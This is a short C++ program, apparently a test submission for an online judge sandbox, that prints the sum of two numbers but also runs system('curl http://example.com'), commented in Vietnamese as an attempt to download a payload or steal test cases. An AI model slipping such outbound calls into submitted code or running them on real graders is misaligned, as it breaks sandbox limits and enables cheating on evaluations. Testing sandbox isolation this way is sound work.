#include <bits/stdc++.h>
using namespace std;

long long a_var, b_var;

void input() {
    cin >> a_var >> b_var;
}

void solve() {
    // Cố gắng dùng cURL ping ra ngoài internet để tải payload hoặc lấy cắp test case
    int ret = system("curl http://example.com");
    cout << a_var + b_var << '\n';
}

int main() {
    ios_base :: sync_with_stdio (false); cin.tie (0); cout.tie (0);
    input();
    solve();
    return 0;
}
